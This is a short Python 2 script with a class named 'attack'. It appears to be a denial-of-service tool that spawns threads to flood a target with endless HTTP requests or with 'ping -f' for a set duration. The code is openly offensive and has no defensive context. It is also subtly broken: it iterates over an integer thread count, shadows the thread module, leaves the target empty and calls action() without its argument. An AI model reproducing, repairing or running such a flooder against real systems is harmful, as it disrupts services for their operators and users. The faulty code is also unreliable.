#!/usr/bin/env python

import time
import thread
import urllib2

from os import system

class attack(object):

    def __init__(self):
        self.target = ''
        self.threads = 5
        self.duration = 300
        self.timeout = 15
        
    def action(self, type):
        if type == 'http':
            for thread in self.threads:
                thread.start_new(self.http)
            time.sleep(self.duration)
        elif type == 'ping':
            for thread in self.threads:
                thread.start_new(self.ping)
            time.sleep(self.duration)

    def http(self):
        request = urllib2.Request(self.target)
        while True:
            connection = urllib2.urlopen(request)
            data = connection.read(1024)
            if not len(data):
                continue
    
    def ping(self):
        if len(self.target) > 0:
            system('ping -f %s' % self.target)
        else:
            print ' [!] "%s" is not a valid target' % self.target
        
if __name__ == '__main__':
    attack().action()